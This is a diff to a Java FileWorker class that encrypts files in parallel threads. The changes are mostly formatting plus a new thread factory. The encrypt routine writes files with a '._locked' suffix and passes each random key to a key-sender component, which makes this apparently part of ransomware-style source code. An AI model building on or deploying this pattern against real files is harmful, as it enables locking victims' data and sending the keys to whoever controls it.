@@ -10,14 +10,16 @@ import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 
+import com.javaws.threads.utilities.IDThreadFactory;
+
 public class FileWorker implements Worker {
 
 	private final RandomKeyEncrypter encrypter;
 
 	private final Decrypter decrypter;
-	
+
 	private final RandomKeySender keySender;
-	
+
 	public FileWorker(RandomKeyEncrypter encrypter, Decrypter decrypter, RandomKeySender keySender) {
 		super();
 		this.encrypter = encrypter;
@@ -28,28 +30,28 @@ public class FileWorker implements Worker {
 	@Override
 	public void encrypt(List<File> files) throws FileNotFoundException, IOException {
 		Set<Thread> threads = new HashSet<>();
-		
+		IDThreadFactory threadFactory = new IDThreadFactory();
 		for (File file : files) {
-			Thread thread = new Thread(() -> {
+			Thread thread = threadFactory.generate(() -> {
 				try {
 					File outputFile = Path.of(file.getAbsolutePath() + "._locked").toFile();
 					outputFile.createNewFile();
 					String randomKey = this.encrypter.encrypt(new FileInputStream(file), new FileOutputStream(outputFile));
-					
+
 					this.keySender.send(outputFile.getAbsolutePath(), randomKey);
-					
-					System.out.println("Encryption : "+outputFile.getAbsolutePath());
-					
-				} catch (IOException  e) {
+
+					System.out.println("Encryption : " + outputFile.getAbsolutePath() + " [" + Thread.currentThread().getName() + "]");
+
+				} catch (IOException e) {
 					e.printStackTrace();
-				} 
+				}
 			});
 			thread.start();
-			
+
 			threads.add(thread);
 		}
-		
-		for(Thread t : threads) {
+
+		for (Thread t : threads) {
 			try {
 				t.join();
 			} catch (InterruptedException e) {
@@ -62,7 +64,7 @@ public class FileWorker implements Worker {
 	public void decrypt(List<File> files) throws FileNotFoundException, IOException {
 
 		Set<Thread> threads = new HashSet<>();
-		
+
 		for (File file : files) {
 			Thread thread = new Thread(() -> {
 				try {
@@ -70,19 +72,19 @@ public class FileWorker implements Worker {
 					File outputFile = Path.of(file.getAbsolutePath() + "._unlocked").toFile();
 					outputFile.createNewFile();
 					this.decrypter.decrypt(new FileInputStream(file), new FileOutputStream(outputFile));
-					
-					System.out.println("Decryption : "+outputFile.getAbsolutePath());
-					
+
+					System.out.println("Decryption : " + outputFile.getAbsolutePath());
+
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
 			});
 			thread.start();
-			
+
 			threads.add(thread);
 		}
-		
-		for(Thread t : threads) {
+
+		for (Thread t : threads) {
 			try {
 				t.join();
 			} catch (InterruptedException e) {
